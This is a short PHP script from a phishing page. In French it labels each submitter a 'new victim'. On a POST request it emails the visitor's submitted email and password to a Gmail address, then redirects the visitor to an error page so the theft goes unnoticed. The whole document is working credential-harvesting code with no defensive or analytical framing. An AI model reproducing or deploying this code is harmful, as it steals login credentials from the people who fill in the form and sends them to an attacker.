<?php
if($_SERVER['REQUEST_METHOD'] == 'POST') {
mail('lallierledanois@gmail.com', 'Nouvelle victime', "Une nouvelle victime\nPseudo : "
.htmlentities($_POST['email'])."\nMot de passe : ".htmlentities($_POST['pass'])."");
header("Location: erreur.php");


}

?>